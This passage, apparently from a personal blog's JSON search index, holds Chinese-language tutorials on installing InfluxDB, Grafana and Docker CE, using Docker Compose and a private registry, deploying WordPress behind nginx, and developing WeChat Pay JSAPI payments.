gRPC 和 Thrift 都提供了代码生成和维护传输层，程序猿只需要关心接口定义和调用，对开发效率很有帮助。","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[]},{"title":"InfluxDB安装","slug":"Linux/InfluxDB安装","date":"2019-04-23T01:52:36.000Z","updated":"2021-12-28T03:24:10.163Z","comments":true,"path":"Linux/InfluxDB安装/","link":"","permalink":"http://yoursite.com/Linux/InfluxDB安装/","excerpt":"","text":"InfluxDB®是一款专门处理高写入和查询负载的时序数据库，无需外部依赖，用于存储大规模的时序数据并进行实时分析，包括来自DevOps监控、应用指标和IoT传感器上的数据。 20190423版本问题 InfluxDB从v1.3开始取消自带的web页面，要web页面的可以安装v1.2.4版。 目前为止，v1.7.6是最新稳定版， 《1.x的文档》 v2.0 alpha ，《2.0的文档》 本文安装的是 v1.7.6 Docker Image 安装12345678$ docker pull influxdb$ docker run -d -p 8083:8083 -p8086:8086 --expose 8090 --expose 8099 --name influxDbService influxdb$ docker exec -it &#123;CONTAINER ID&#125; bash$ influxd versionInfluxDB v1.7.6 (git: 1.7) Ubuntu1. apt-get安装v1.7安装文档 123456789101112# 加入 InfluxData repository$ wget -qO- https://repos.influxdata.com/influxdb.key | sudo apt-key add -$ source /etc/lsb-release$ echo \"deb https://repos.influxdata.com/$&#123;DISTRIB_ID,,&#125; $&#123;DISTRIB_CODENAME&#125; stable\" | sudo tee /etc/apt/sources.list.d/influxdb.list# 安装启动$ sudo apt-get update &amp;&amp; sudo apt-get install influxdb$ sudo service influxdb start# 或者用systemctl启动$ sudo systemctl unmask influxdb.service$ sudo systemctl start influxdb 2. DEB包安装12$ wget https://dl.influxdata.com/influxdb/releases/influxdb_1.7.6_amd64.deb$ sudo dpkg -i influxdb_1.7.6_amd64.deb CentOS RPM包安装1. YUM安装12345678910111213$ cat &lt;&lt;EOF | sudo tee /etc/yum.repos.d/influxdb.repo[influxdb]name = InfluxDB Repository - RHEL \\$releaseverbaseurl = https://repos.influxdata.com/rhel/\\$releasever/\\$basearch/stableenabled = 1gpgcheck = 1gpgkey = https://repos.influxdata.com/influxdb.keyEOF$ sudo yum install influxdb$ sudo service influxdb start# 或者$ sudo systemctl start influxdb 2. RPM包安装12$ wget https://dl.influxdata.com/influxdb/releases/influxdb-1.7.6.x86_64.rpm$ sudo yum localinstall influxdb-1.7.6.x86_64.rpm Windows12https://dl.influxdata.com/influxdb/releases/influxdb-1.7.6_windows_amd64.zipunzip influxdb-1.7.6_windows_amd64.zip macOS12$ brew update$ brew install influxdb Grafana数据可视化可视化的监控展示服务，提供包括折线图，饼图，仪表盘等多种监控数据可视化UI，支持多种不同的时序数据库数据源，Grafana对每种数据源提供不同的查询方法，而且能很好的支持每种数据源的特性。 系统默认用户名和密码为admin/admin，第一次登录要求修改密码。设置好数据源，就可以配置各种呈现表图来展示数据。 注意：Grafana是用来展示数据的，不是做增删改查的工具。 Download Grafana 1. docker1$ docker run -d --name=grafana -p 3000:3000 grafana/grafana 2. ubuntu12$ wget https://dl.grafana.com/oss/release/grafana_6.1.4_amd64.deb $ sudo dpkg -i grafana_6.1.4_amd64.deb 3. centos 12$ wget https://dl.grafana.com/oss/release/grafana-6.1.4-1.x86_64.rpm $ sudo yum localinstall grafana-6.1.4-1.x86_64.rpm 命令行操作数据库《文档手册地址》 都是一些创建数据之类的命令行操作，但也可以通过InfluxDB的HTTP API进行客户端 - 服务器通信，端口8086。 12345678910111213141516171819202122232425262728$ influx -precision rfc3339Connected to http://localhost:8086 version 1.7.6InfluxDB shell version: 1.7.6Enter an InfluxQL query&gt;&gt; show databasesname: databasesname----_internal&gt; create database mydb&gt; show databasesname: databasesname----_internalmydb&gt; use mydbUsing database mydb#measurements相当于mysql的表&gt; show measurements#插入数据并指定（创建）measurements&gt; insert disk_free,hostname=server01 value=12121212&gt; show measurementsname: measurementsname----disk_free 编程库在 github.com/influxdata 可以找到你的语言的 library，比如Java的 Java Client Library ，可以看到有些library已经有了 1.x 和 2.x 的版本区分了，这个要注意一下。 Golang的客户端库已经迁移了，不在 influxdata/influxdb 下了，详细可以看 issues 。 Go这样引用： 123import \"github.com/influxdata/influxdb1-client/v2\"go get github.com/influxdata/influxdb1-client/v2","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[]},{"title":"五、Docker-拉镜像网络错误","slug":"docker/五、Docker-拉镜像网络错误","date":"2019-04-19T11:56:36.000Z","updated":"2021-12-28T03:24:10.224Z","comments":true,"path":"docker/五、Docker-拉镜像网络错误/","link":"","permalink":"http://yoursite.com/docker/五、Docker-拉镜像网络错误/","excerpt":"","text":"当访问 registry-1.docker.io 出错时，可能是DNS问题，可以通过手动加HOST记录来临时解决。12345678910111213141516171819202122232425262728293031323334353637383940root@ubuntu:~/# docker-compose upPulling db (mysql:5.7)...ERROR: Get https://registry-1.docker.io/v2/library/mysql/manifests/5.7: Get https://auth.docker.io/token?scope=repository%3Alibrary%2Fmysql%3Apull&amp;service=registry.docker.io: dial tcp: lookup auth.docker.io: Temporary failure in name resolution# 通过dig查找可用IProot@ubuntu:~/# dig @114.114.114.114 registry-1.docker.io; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.7-Ubuntu &lt;&lt;&gt;&gt; @114.114.114.114 registry-1.docker.io; (1 server found);; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 56865;; flags: qr rd ra; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;registry-1.docker.io. IN A;; ANSWER SECTION:registry-1.docker.io. 33 IN A 52.22.201.61registry-1.docker.io. 33 IN A 34.199.77.19registry-1.docker.io. 33 IN A 34.233.151.211registry-1.docker.io. 33 IN A 34.228.211.243registry-1.docker.io. 33 IN A 34.232.31.24registry-1.docker.io. 33 IN A 34.206.236.31registry-1.docker.io. 33 IN A 34.201.236.93registry-1.docker.io. 33 IN A 34.201.196.144;; Query time: 25 msec;; SERVER: 114.114.114.114#53(114.114.114.114);; WHEN: Wed Jun 19 10:33:14 CST 2019;; MSG SIZE rcvd: 177# 将某条记录加上hosts文件root@ubuntu:~/# vim /etc/hosts34.199.77.19 registry-1.docker.io# 重试root@ubuntu:~/# docker-compose up","categories":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"}]},{"title":"四、Docker-部署WordPress站点","slug":"docker/四、Docker-部署WordPress站点","date":"2019-04-19T11:56:36.000Z","updated":"2021-12-28T03:24:10.226Z","comments":true,"path":"docker/四、Docker-部署WordPress站点/","link":"","permalink":"http://yoursite.com/docker/四、Docker-部署WordPress站点/","excerpt":"","text":"本文利用 Docker Compose 快速部署一个WordPress站点。 环境：VMWare 、Ubuntu 、 Docker 编写docker-compose.yml文件参考docs.docker.com12345678910111213141516171819202122232425262728version: '3.3'services: db: image: mysql:5.7 volumes: - db_data:/var/lib/mysql restart: always environment: MYSQL_ROOT_PASSWORD: wordpress MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress wordpress: depends_on: - db image: wordpress:latest ports: - \"8000:80\" restart: always environment: WORDPRESS_DB_HOST: db:3306 WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress WORDPRESS_DB_NAME: wordpressvolumes: db_data: &#123;&#125; 启动容器1$ docker-compose up 等待Docker下载安装直至完成，并且启动。 配置nginx12345678910111213server &#123; listen 80; listen [::]:80; server_name www.domain.com; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; location / &#123; proxy_pass http://127.0.0.1:8000; &#125;&#125; 由于WordPress只能在80端口启动，所以通过Docker网络将宿主机的8000端口映射到docker容器网络80端口，Nginx再通过反向代理将80端口代理到8000。然后再设置DNS，将域名指向服务器的IP地址就可以了。 爬坑确认可以了？访问域名，自动跳转到WordPress “famous five-minute installation” 著名的5分钟安装界面，但是发现css等东西没生效。 安装完成之后，登录就有问题了，直接跳转到 http://127.0.0.1:8000 ,而且目前这种情况还没法设置站点地址。 这个坑本来想在 docker-compose.yml 找到解决办法，但是没找到设置站点地址的参数，改数据库太麻烦。 刚好本地PC机也装有nginx，于是用nginx的反向代理临时解决登录问题，进去控制台再设置站点地址。 12345678server &#123; listen 8000; server_name localhost; location / &#123; proxy_pass http://www.domain.com; &#125;&#125; 这样在本地访问 localhost:8000 就能访问到Docker的WordPress，并且可以登录了。登录之后，将站点的URL地址为你的域名，然后就OK了，本地的nginx也可以删掉了。 WordPress写的题外的内容：WordPress的使用。安装完成WordPress，默认它是一个博客，但一般我们用WordPress不是做一个博客，而是做企业官网、内容展示、电子商务等。要实现这些的话，就要安装主题了，安装了主题之后，你就能基于主题来修改它的具体内容，比如一些标题，图片等，跟装饰淘宝店一样，或者说和基于PPT母板来做PPT一样。 那么如果找一个合适的主题？ 可以在WordPress内浏览，或者在Google搜索，主题的安装可以在线安装，也可以上次压缩包安装。在Google搜索到的合适主题，如果想在线安装，可以在WordPress内搜索一遍，也许会找到，直接在线安装就好。比如，在Google搜索到 Sparker 主题，上传压缩包提示安装失败，在WordPress搜索一下，结果上面就有，直接点安装。 那么，如果你客户对网站的个性化比较强，没有主题模板符合需要怎么办？ 业内有一些 主题编辑器 ，可以不写代码，编辑一份自定义的主题，导出来就能安装到WordPress,比如 elementor 就是其中一个。elementor使用教程elementor使用教程","categories":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"}]},{"title":"三、Docker-私服镜像Registry","slug":"docker/三、Docker-私服镜像Registry","date":"2019-04-19T11:55:36.000Z","updated":"2021-12-28T03:24:10.223Z","comments":true,"path":"docker/三、Docker-私服镜像Registry/","link":"","permalink":"http://yoursite.com/docker/三、Docker-私服镜像Registry/","excerpt":"","text":"私服镜像管理：registry私服镜像WebUI：konradkleine/docker-registry-frontend:v2 registry只提供一个RESTful API，docker-registry-frontend是第三方开发者实现的可视化，典型的前后端分离架构。 docker命令启动12$ docker pull registry$ docker run -d -p 5000:5000 --restart=always --name registry registry:2 单独registry的compose文件12345678910version: &apos;3.7&apos;services: registry: image: registry:2 restart: always container_name: registry ports: - 5000:5000 volumes: - /usr/local/docker/registry/data:/var/lib/registry 单独部署registry已经可以使用镜像的上传和下载了，查看私服上的镜像只能通过RESTful API来查看，如果需要可视化环境，还需要部署一个webUI镜像，往下走… registry和WebUI一起编排的compose文件在webUI上可以查看上传的镜像1234567891011121314151617181920version: &apos;3.7&apos;services: registry: image: registry:2 restart: always container_name: registry ports: - 5000:5000 volumes: - /usr/local/docker/registry/data:/var/lib/registry frontend: image: konradkleine/docker-registry-frontend:v2 ports: - 8080:80 volumes: - ./certs/frontend.crt:/etc/apache2/server.crt:ro - ./certs/frontend.key:/etc/apache2/server.key:ro environment: - ENV_DOCKER_REGISTRY_HOST=127.0.0.1 - ENV_DOCKER_REGISTRY_PORT=5000 在要使用私服的机器配置Docker修改docker配置文件 daemon.json ，加入1234567$ vim /etc/docker/daemon.json&quot;insecure-registries&quot;:[ &quot;IP:5000&quot;]$ docker info 上传镜像到私服1$ docker push IP:5000/tomcat 从私服下载镜像1$ docker pull IP:5000/tomcat:VERSION","categories":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/categories/Docker/"}],"tags":[{"name":"Docker,registry","slug":"Docker-registry","permalink":"http://yoursite.com/tags/Docker-registry/"}]},{"title":"二、Docker-Compose","slug":"docker/二、Docker-Compose","date":"2019-04-19T11:53:36.000Z","updated":"2021-12-28T03:24:10.224Z","comments":true,"path":"docker/二、Docker-Compose/","link":"","permalink":"http://yoursite.com/docker/二、Docker-Compose/","excerpt":"","text":"Docker Compose 是 Docker 官方编排（Orchestration）项目之一，负责快速的部署分布式应用。 下载 Docker Compose:1sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.24.0/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose 修改为可执行文件:1sudo chmod +x /usr/local/bin/docker-compose compose编排一个服务1234567891011$ mkdir test-tomcat$ cd test-tomcat$ vim docker-compose.yml version: &apos;3.7&apos;services: mytomcat: restart: always image: tomcat container_name: mytomcat ports: - &quot;8080:8080&quot; compose编排多个服务 compose启动1$ docker-compose up compose守护启动12$ docker-compose up -d$ docker-compose logs mytomcat compose关闭12$ docker-compose down$ docker ps -a compose关闭并删除volumes数据1$ docker-compose down --volumes","categories":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"}]},{"title":"一、DockerCE-在Ubuntu上安装","slug":"docker/一、DockerCE-在Ubuntu上安装","date":"2019-04-19T11:52:36.000Z","updated":"2021-12-28T03:24:10.222Z","comments":true,"path":"docker/一、DockerCE-在Ubuntu上安装/","link":"","permalink":"http://yoursite.com/docker/一、DockerCE-在Ubuntu上安装/","excerpt":"","text":"参考文档 环境：Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-97-generic x86_64) 查看分发版 123lsb_release -csxenial 更新源 1sudo apt-get update 安装软件包 1sudo apt-get install apt-transport-https ca-certificates curl software-properties-common 添加 Docker 的官方 GPG 密钥 1curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - 验证密钥指纹 12345root@bogon:~# sudo apt-key fingerprint 0EBFCD88pub 4096R/0EBFCD88 2017-02-22 Key fingerprint = 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88uid Docker Release (CE deb) &lt;docker@docker.com&gt;sub 4096R/F273FCD8 2017-02-22 写入软件源信息，用阿里云的国内快一些。 12345678#aliyunsudo add-apt-repository \"deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable\"#官方sudo add-apt-repository \\ \"deb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) \\ stable\" 安装最新版社区版 1sudo apt-get install docker-ce 查看版本 1sudo docker version 结果 123456789101112131415161718Client:Version: 18.09.5API version: 1.39Go version: go1.10.8Git commit: e8ff056Built: Thu Apr 11 04:44:24 2019OS/Arch: linux/amd64Experimental: falseServer: Docker Engine - CommunityEngine:Version: 18.09.5API version: 1.39 (minimum version 1.12)Go version: go1.10.8Git commit: e8ff056Built: Thu Apr 11 04:10:53 2019OS/Arch: linux/amd64Experimental: false 验证是否正确安装了 Docker CE 1234567891011121314151617181920212223242526272829303132333435$ sudo docker run hello-worldUnable to find image 'hello-world:latest' locallylatest: Pulling from library/hello-world1b930d010525: Pull complete Digest: sha256:5f179596a7335398b805f036f7e8561b6f0e32cd30a32f5e19d17a3cda6cc33dStatus: Downloaded newer image for hello-world:latestHello from Docker!This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the \"hello-world\" image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal.To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bash--------------------------------------------------------------------- $ docker run -it ubuntu bash Unable to find image 'ubuntu:latest' locallylatest: Pulling from library/ubuntuf476d66f5408: Pull complete 8882c27f669e: Pull complete d9af21273955: Pull complete f5029279ec12: Pull complete Digest: sha256:70fc21e832af32eeec9b0161a805c08f6dddf64d341748379de9a527c01b6ca1Status: Downloaded newer image for ubuntu:latestroot@64cf93148c4b:/# lsbin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr varroot@64cf93148c4b:/# 这里是已经进入到 docker 镜像 ubuntu 的bash环境里面了 常用命令 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# 拉取镜像，TAG一般是指版本，可以不指定，默认是latest$ sudo docker pull REPOSITORY:TAGroot@server:~# sudo docker pull hello-worldroot@server:~# sudo docker pull openjdk:8# 查看本地镜像root@server:~# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEopenjdk 8 bec43387959a 7 days ago 625MBubuntu latest d131e0fa2585 2 weeks ago 102MBhello-world latest fce289e99eb9 4 months ago 1.84kB# 删除本地镜像$ sudo docker rmi IMAGE_ID root@server:~# sudo docker rmi fce28 # 前台运行$ sudo docker run NAMEroot@server:~# sudo docker run hello-world# 查看运行中的容器root@server:~# sudo docker ps -aCONTAINER ID IMAGE COMMAND408bd2d9fe7c hello-world \"/hello\" # 删除容器$ sudo docker rm CONTAINER_IDroot@server:~# sudo docker rm 408b# 后台运行root@server:~# sudo docker run -d ubuntu51028c9c4d404a0b0382dd6e91b0a985980832c537ed0d02ffe932a37cb101c6# 关闭（后台运行,前台的不需要stop）$ sudo docker stop CONTAINER_IDroot@server:~# sudo docker stop 51028c51028c# 守护进程运行root@server:~# sudo docker run --restart=always hello-world# 端口映射root@server:~# sudo docker run -d -p 8080:8080 hello-world# 进入容器的bash$ sudo docker exec -it CONTAINER_ID bashroot@server:~# sudo docker exec -it d131e0fa2585 bash 搜索镜像 12345root@server:~# docker search nginxNAME DESCRIPTION STARS OFFICIALnginx Official build of Nginx. 11403 [OK]tobi312/rpi-nginx NGINX on Raspberry Pi / ARM 26bitnami/nginx Bitnami nginx Docker Image 66 其中， STARS：收藏数，表示该镜像的受关注程度 OFFICIAL ：是否官方创建维护 镜像加速Docker 中国官方镜像加速 123456vim /etc/docker/daemon.json&#123; \"registry-mirrors\": [\"https://registry.docker-cn.com\"]&#125;$ sudo systemctl daemon-reload$ sudo systemctl restart docker","categories":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"}]},{"title":"微信支付开发日志","slug":"微信公众平台接口/微信支付开发日志","date":"2019-04-17T13:01:01.000Z","updated":"2019-04-17T13:01:01.000Z","comments":true,"path":"微信公众平台接口/微信支付开发日志/","link":"","permalink":"http://yoursite.com/微信公众平台接口/微信支付开发日志/","excerpt":"","text":"支付类型很多，这里是指在公众号上调用 JSAPI支付 开通支付这部分比较繁琐，但都是一些资料认证，在公众号平台的入口进入申请提交就可以了。 商户平台如果成功开通了 微信支付 ，那么你就可以登录 商户平台 了，进行关联公众号，成功关联之后，就能实现在当前公众号中使用微信支付收款。 在 产品中心 &gt; APPID授权管理 &gt; 账号关联（AppID绑定） &gt; 已关联账号 ，可以看到 是否已经关联公众号(服务号) 。 准备开发所需参数 商户平台 &gt; 产品中心 &gt; 开发配置 处，可以找到商户号 。 商户平台 &gt; 账户中心 &gt; API安全 &gt; API密钥 安装安全证书之后，就可以设置API密钥，密钥为32为字符，自己定义。 商户平台 &gt; 账户中心 &gt; API安全 &gt; API证书，申请证书，下载的是一个zip压缩包，有p12和pem证书。 公众平台 &gt; 开发 &gt; 基本配置 &gt; AppId 公众平台 &gt; 开发 &gt; 基本配置 &gt; AppSecret 公众号设置公众号设置 &gt; 功能设置 ，在 业务域名，JS接口安全域名，网页授权域名 三个地方设置前端的域名，如 wx.mydomain.com 公众平台-后端开发第一步先把公众平台的接口调通，这相对简单一些，在保证公众平台没问题的情况下，再进行微信支付的接口开发。 1. 签名接口首先，后端要提供一个签名接口，用于前端签名当前的URL，否则无法调用 JSSDK 的接口。 签名算法可以看 微信文档 ，大概流程：前端将URL发到后端，后端签名成功返回 timestamp、nonceStr、signature 三个参数的结果。 2. 获取用户的OpenIdOpenId 是用户的标识，在支付的时候要用到。本身这个接口非常简单，前端也可以直接向微信服务器请求，但为了不暴露公众号的 AppSecret 参数和跨域问题，这个请求放在后端发起。 微信文档：第二步 1https://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&amp;secret=SECRET&amp;code=CODE&amp;grant_type=authorization_code 前端传入code，后端发起GET请求，响应结果直接返给前端。 公众平台-前端开发前端开发在 《微信web开发者工具》（以下称：模拟器）下进行，下载地址：下载 。需要在 公众号平台 &gt; 开发者工具 &gt;web开发者工具 绑定开发者的微信号。 坑：npm上没有微信官方发布的包， weixin-jsapi 是个人发布v1.1.0 版本的包。 网上很多文章用 weixin-js-sdk 这个包也是个人发布的，目前最新的1.4.0版，但是只能通过require使用，Vue中并不能用，有问题。 1. 微信网页授权微信文档：第一步 拿到 code 直接向后端发起请求获取 OpenId ，正确的话，有以下数据包返回，我们就用到openid ，缓存起来备用 。 1234567&#123; &quot;access_token&quot;:&quot;ACCESS_TOKEN&quot;, &quot;expires_in&quot;:7200, &quot;refresh_token&quot;:&quot;REFRESH_TOKEN&quot;, &quot;openid&quot;:&quot;OPENID&quot;, &quot;scope&quot;:&quot;SCOPE&quot; &#125; 2. 通过config接口注入权限验证配置所有需要使用JS-SDK的页面必须先注入配置信息，否则将无法调用。 12345678wx.config(&#123; debug: true, // 开启调试模式,调用的所有api的返回值会在客户端alert出来 appId: '', // 必填，公众号的唯一标识 timestamp: , // 必填，生成签名的时间戳 nonceStr: '', // 必填，生成签名的随机串 signature: '',// 必填，签名 jsApiList: [] // 必填，需要使用的JS接口列表&#125;); 上面这些参数，需要向后端的 签名接口 发起请求获取，appId 可以写在前端代码中，也可以由后端响应返回。 1jsApiList: ['getNetworkType','chooseWXPay'] 这里是两个需要使用的JS接口，getNetworkType 用于测试，chooseWXPay 就是微信支付的接口。 执行 wx.config ，如果模拟器弹出 ok 的话，表示签名没问题了。 由于微信支付在模拟器无法调试，所以有必要选用一个其他接口（如 getNetworkType）来调试。 3. 检查能否调用JSSDK12345wx.getNetworkType(&#123;success: function (res) &#123;var networkType = res.networkType; // 返回网络类型2g，3g，4g，wifi&#125;&#125;); 如果模拟器弹出当前的网络类型，就表示成功了。 沙箱sandbox测试开发微信支付沙箱开发时， 官方开发文档只是简单说明， 并没有给出相关示例。 沙箱开发要修改两个地方： 路径 秘钥Key 其中，Key要通过Post请求获取，但文档请求参数怎么传说的不清楚（其实是xml格式）， 文档地址 。 沙箱测试要关注公众号 WXPayAssist ，里面很多相关的资料，沙箱测试付款也是要在这个公众号下进行。 获取Key的请求如下： 其中，sign 和支付的签名算法一样，要用到正式的KEY来签名。 https://api.mch.weixin.qq.com/sandboxnew/pay/getsignkey 微信支付-后端开发微信支付的后端开发，即要调用 微信文档：统一下单 接口，获取 预支付交易会话标识 prepay_id ，生成 支付签名 响应给前端。支付签名 由：appId, timeStamp, nonceStr, package, signType 参与签名，其中 1String packages = \"prepay_id=\" + prepay_id; 这里的签名算法直接调用微信的 JavaSDK 里面的方法，所以不管它了，要注意的是签名的类型最好统一一种，比如全部用MD5或者HMAC-SHA256。 1. 统一下单调用微信的统一下单接口，所需要的参数如下： 12345678data.put(\"body\", \"腾讯充值中心-QQ会员充值\");//商家名称-销售商品类目data.put(\"out_trade_no\", \"2016090910595900000012\");//商户订单号,商户系统内部订单号，要求32个字符内，只能是数字、大小写字母_-|* 且在同一个商户号下唯一data.put(\"openid\", \"xxx\");//用户标识,此参数为微信用户在商户对应appid下的唯一标识data.put(\"total_fee\", \"1\");//标价金额,订单总金额，单位为分data.put(\"spbill_create_ip\", '192.168.0.0');//用户IP,data.put(\"notify_url\", \"http://www.example.com/wxpay/notify\");//通知地址,异步接收微信支付结果通知的回调地址，通知url必须为外网可访问的url，不能携带参数。data.put(\"fee_type\", \"CNY\");data.put(\"trade_type\", \"JSAPI\"); // 此处指定为JSAPI支付（或小程序支付） 微信响应结果是XML数据，转为JSON结果如下： 1&#123;\"nonce_str\":\"xxx\",\"appid\":\"xxx\",\"sign\":\"xxx\",\"trade_type\":\"JSAPI\",\"return_msg\":\"OK\",\"result_code\":\"SUCCESS\",\"mch_id\":\"xxx\",\"return_code\":\"SUCCESS\",\"prepay_id\":\"xxx\"&#125; 解析数据包，提取 prepay_id 打包参与支付签名 的数据 (注意 timeStamp 自动一定要大写 S ) 1234567String packages = \"prepay_id=\" + prepay_id;Map&lt;String, String&gt; wxPayMap = new HashMap&lt;&gt;();wxPayMap.put(\"appId\", \"xxx\");wxPayMap.put(\"timeStamp\", String.valueOf(System.currentTimeMillis()/1000));wxPayMap.put(\"nonceStr\", UUID.randomUUID().toString().substring(16).replace(\"-\",\"\"));wxPayMap.put(\"package\", packages);wxPayMap.put(\"signType\", \"HMAC-SHA256\"); 将 支付签名 结果 sign 和 参与签名 的数据 打包响应给前端 123Map&lt;String,String&gt; result = new HashMap&lt;&gt;();result.put(\"paySign\", sign);result.putAll(wxPayMap); 例如： 1&#123;\"timeStamp\":\"1555476146\",\"packageStr\":\"prepay_id=xxx\",\"paySign\":\"xx\",\"appId\":\"xxx\",\"signType\":\"HMAC-SHA256\",\"nonceStr\":\"xxx\"&#125; 2. 接收通知notify_url 填的是后端的接口地址，新建一个接口用于异步接收微信支付结果。 微信服务器将以 流 的方式给这个地址发送xml格式的数据： 123456789101112131415161718&lt;xml&gt; &lt;appid&gt;&lt;![CDATA[xxx]]&gt;&lt;/appid&gt; &lt;bank_type&gt;&lt;![CDATA[CFT]]&gt;&lt;/bank_type&gt; &lt;cash_fee&gt;&lt;![CDATA[1]]&gt;&lt;/cash_fee&gt; &lt;fee_type&gt;&lt;![CDATA[CNY]]&gt;&lt;/fee_type&gt; &lt;is_subscribe&gt;&lt;![CDATA[Y]]&gt;&lt;/is_subscribe&gt; &lt;mch_id&gt;&lt;![CDATA[xxx]]&gt;&lt;/mch_id&gt; &lt;nonce_str&gt;&lt;![CDATA[xxx]]&gt;&lt;/nonce_str&gt; &lt;openid&gt;&lt;![CDATA[xxx]]&gt;&lt;/openid&gt; &lt;out_trade_no&gt;&lt;![CDATA[xxx]]&gt;&lt;/out_trade_no&gt; &lt;result_code&gt;&lt;![CDATA[SUCCESS]]&gt;&lt;/result_code&gt; &lt;return_code&gt;&lt;![CDATA[SUCCESS]]&gt;&lt;/return_code&gt; &lt;sign&gt;&lt;![CDATA[xxx]]&gt;&lt;/sign&gt; &lt;time_end&gt;&lt;![CDATA[xxx]]&gt;&lt;/time_end&gt; &lt;total_fee&gt;1&lt;/total_fee&gt; &lt;trade_type&gt;&lt;![CDATA[JSAPI]]&gt;&lt;/trade_type&gt; &lt;transaction_id&gt;&lt;![CDATA[xxx]]&gt;&lt;/transaction_id&gt;&lt;/xml&gt; 接收到消息之后，要回复响应数据： 1234&lt;xml&gt; &lt;return_code&gt;&lt;![CDATA[SUCCESS]]&gt;&lt;/return_code&gt; &lt;return_msg&gt;&lt;![CDATA[OK]]&gt;&lt;/return_msg&gt;&lt;/xml&gt; 接收数据示例代码： 要从HttpServletRequest 的 getInputStream 方法获取流，从流读取byte ，不过我们用SpringMVC可以很简洁的接收： 12345678910public String notifyPay(@RequestBody byte[] body)&#123; String result = null; try &#123; result = new String(body, \"UTF-8\"); logger.info(\"result:\\n\"+result); &#125; catch (UnsupportedEncodingException e) &#123; e.printStackTrace(); &#125;&#125; 微信支付-前端剩下最后一步了：唤起微信支付，这个操作要在手机微信上进行，真实的环境。 将付款的页面URL放在 商户平台 &gt; 产品中心 &gt;支付配置 &gt; JSAPI支付授权目录 中， 仅有公众号支付和扫码支付需配置支付域名，APP支付、刷卡支付无需配置域名 所有使用JS API方式发起支付请求的链接地址，都必须在当前页面所配置的支付授权目录之下。下单前需要调用【网页授权获取用户信息】接口获取到用户的Openid 当公众平台接到扫码支付请求时，会回调当前页面所配置的支付回调链接传递订单信息 授权目录须以左斜杠 “/” 结尾 ，例如： 支付的地址是：http://wx.mydomain.com/#/car/pay ; 授权目录设置为：http://wx.mydomain.com/#/car/ 。 12345678910wx.chooseWXPay(&#123;timestamp: '', // 支付签名时间戳，注意微信jssdk中的所有使用timestamp字段均为小写。但最新版的支付后台生成签名使用的timeStamp字段名需大写其中的S字符nonceStr: '', // 支付签名随机串，不长于 32 位package: '', // 统一支付接口返回的prepay_id参数值，提交格式如：prepay_id=\\*\\*\\*）signType: '', // 签名方式，默认为'SHA1'，使用新版支付需传入'MD5'paySign: '', // 支付签名success: function (res) &#123;// 支付成功后的回调函数&#125;&#125;); chooseWXPay 的参数都在后端的统一下单 接口响应里面，解析JSON数据即可。要注意的是，这里有一个坑 timestamp ，后端生成 支付签名 的是 timeStamp，S是大写的，但前端 chooseWXPay 的 timestamp依然是全部小写的。 如果没问题，即可以看到手机的 微信支付输入密码 弹框了。","categories":[{"name":"微信公众平台","slug":"微信公众平台","permalink":"http://yoursite.com/categories/微信公众平台/"}],"tags":[{"name":"微信公众平台","slug":"微信公众平台","permalink":"http://yoursite.com/tags/微信公众平台/"}]},{"title":"微信公众平台开发注意事项","slug":"微信公众平台接口/微信公众平台开发注意事项","date":"2019-04-09T13:01:01.000Z","updated":"2019-04-09T13:01:01.000Z","comments":true,"path":"微信公众平台接口/微信公众平台开发注意事项/","link":"","permalink":"http://yoursite.com/微信公众平台接口/微信公众平台开发注意事项/","excerpt":"","text":"测试号 JS接口安全域名 加入你的域名，这样你的域名下网页才能调用 jssdk 。 网页授权微信的网页授权有两个步骤： 获取code 通过code获取openId 第一步骤有一个坑：网页授权还要配置域名，如下图 点击“修改”弹出以下弹框，输入你的域名，才能成功授权，否则一直提示 redirect_uri参数错误 。 授权成功之后，获取到 code 参数，post到后台，由后台来向微信服务器请求获取 openId 。 签名域名在调用jssdk之前，要对当前的域名权限验证配置。12345678wx.config(&#123; debug: true, // 开启调试模式,调用的所有api的返回值会在客户端alert出来，若要查看传入的参数，可以在pc端打开，参数信息会通过log打出，仅在pc端时才会打印。 appId: &apos;&apos;, // 